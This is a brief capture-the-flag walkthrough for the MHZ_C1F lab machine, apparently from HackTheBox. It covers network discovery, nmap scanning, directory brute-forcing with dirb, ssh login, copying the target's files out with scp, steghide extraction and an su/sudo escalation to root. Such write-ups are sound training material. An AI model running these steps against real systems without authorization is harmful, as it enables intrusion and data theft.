# HackTheBox-MHZ_C1F
CTF’s are a great way to sharpen your skillsets. As a security enthusiast, this is probably the best way to get some hands-on practice that will help gain perspective on how to exploit a vulnerability and how as an infosec professional we will eliminate that risk or guard against it.

## Penetration Testing Methodology

    Network Discovery and Scanning
     -Using Netdiscover
     -Using Nmap
    Enumeration
     -Directory Bruteforce using dirb
    System Exploration
    Data Exfiltration
     -Using SCP
    Steganography
     -Using Steghide
    Privilege Escalation

### Network Discovery
```bash
sudo netdiscover
```
#### Network scanning 
Do a recon of the open ports and services using nmap
```bash
nmap -A <ip_address>
```
## Enumeration
Perform a website fuzzing or enumeration using dirb
```bash
dirb http://<ip_address>/ -X.txt
```
## System exploration
Navigate through the system after performing ssh into the system using the first flag found during enumeration
``` bash
ls
cat user.txt
cd /home
ls
```
## Data exfiltration
Download the data from the target system using scp 
```bash
 scp first_stage@192.168.43.174:/home/mhz_c1f/Paintings/* .
```

## Steganography
Extract the hidden data from the paintings using Steghide
``` bash
steghide extract -sf spinning/ the/ wool.jpeg
cat remb2.txt
```

## Privilege Escalation
Perform ssh into the target machine and switch user to gain root access of the system and find the final flag.
```bash
su mhz_cif
id
sudo su
cd /root
ls
ls –la
cat .root.txt
```


